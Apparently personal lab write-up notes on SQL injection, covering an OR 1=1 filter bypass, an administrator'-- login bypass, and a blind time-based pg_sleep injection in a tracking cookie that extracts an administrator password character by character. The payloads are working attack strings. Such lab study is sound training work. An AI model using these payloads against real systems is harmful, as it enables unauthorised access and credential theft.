# SQL injection

## SQL injection in WHERE clause allowing retrieval of hidden data
Injecting an SQL payload into a GET request. 
```
GET /filter?category='+OR+1=1-- HTTP/2
```

## SQL injection vulnerability allowing login bypass
Entering a single quotation mark ' into the password field creates a 500 Internal Server Error which implies this may be exploitable via SQL injection.
Use the payload: **administrator'--** and fill in any password in order to bypass the password check entirely.

## SQL injection action, querying the database version and type on Oracle

## Blind SQL injection using a timing attack to guess password
There is an SQL injection in the Tracking ID cookie, where the backend submits the tracking id as part of an SQL query without any input validation. This is a blind SQL injection vulnerability and doesn't display anything back to the user, but we can use the conditional function CASE to trigger a sleep when the condition is true:
```
Cookie: TrackingId=x'%3bSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

We can exploit this to try to access the administrator username from the users table:
```
Cookie: TrackingId=x'%3bSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--;
```

We can use the LENGTH prooperty to now determine the length of the password. I used a binary search approach to quickly determine that the length is 20.
```
Cookie: TrackingId=x'%3bSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--;
```

After determing the password length as 20, we we brute-force the password character at a time using Burp's Intruder feature and the SQL SUBSTRING function. We give the Intruder the list of valid characters, and run it for each index in the password
```
TrackingId=x'%3bSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--;
```
In this instance the first character is: 1
second: 3
third: 5
fourth: q
fifth: i
sixth: s
7: q
8: 4
9: 6
10: 0
...